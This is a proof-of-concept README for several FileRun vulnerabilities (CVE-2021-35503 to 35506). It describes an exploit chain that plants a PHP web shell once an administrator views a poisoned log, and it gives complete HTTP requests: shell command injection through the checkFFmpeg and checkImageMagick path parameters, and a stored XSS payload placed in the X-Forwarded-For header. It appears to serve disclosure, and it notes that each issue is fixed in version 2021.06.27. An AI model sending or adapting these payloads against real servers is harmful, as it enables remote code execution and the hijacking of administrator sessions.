# Filerun Proof of Concepts

The `filerun.exploit.chain.py` exploits CVE-2021-35505
and CVE-2021-35503 to upload a PHP shell if an administrator
reviews the poisoned activity log feed.

## Multiple Remote Code Execution (authenticated)

### CVE-2021-35504
An attacker can abuse the *checkFFmpeg* action to trigger code execution.

```
POST /?module=cpanel&section=settings&page=image_preview&action=checkFFmpeg HTTP/1.1
Host: localhost
Content-Length: 29
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/?module=cpanel
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: FileRunSID=887bebeb478e22731a2cabdeb0cf876e
Connection: close

path=ffmpeg%7Cecho%20%60ls%60
```

This is fixed in version "2021.06.27".

### CVE-2021-35505

An attacker can abuse the *checkImageMagick* action to trigger code execution.

```
POST /?module=cpanel&section=settings&page=image_preview&action=checkImageMagick HTTP/1.1
Host: localhost
Content-Length: 40
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/?module=cpanel
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: FileRunSID=887bebeb478e22731a2cabdeb0cf876e
Connection: close

mode=exec&path=convert%7Cecho%20%60ls%60
```

This is fixed in version "2021.06.27".


## Stored Cross-Site-Scripting (authenticated)

### CVE-2021-35506

An attacker can upload an HTML file with malicious javascript code.
The code is executes when a user opens this file using the HTML-Editor.

This is fixed in version "2021.06.27".


## Stored Cross-Site-Scripting (unauthenticated)
### CVE-2021-35503
Sending a malicious *X-Forwarded-For* header results in stored XSS in the admin backend logs.

Proof of concept request:
```
POST /?module=fileman&page=login&action=login HTTP/1.1
Host: localhost
Content-Length: 66
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: iframe
Referer: http://localhost/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
X-Forwarded-For: <iMg onerror=alert(1) src=a>
Cookie: FileRunSID=a99a9ba3867833fd1af9b6549eb83524
Connection: close

username=filerun&password=password&otp=&two_step_secret=&language=
```

This is fixed in version "2021.06.27".
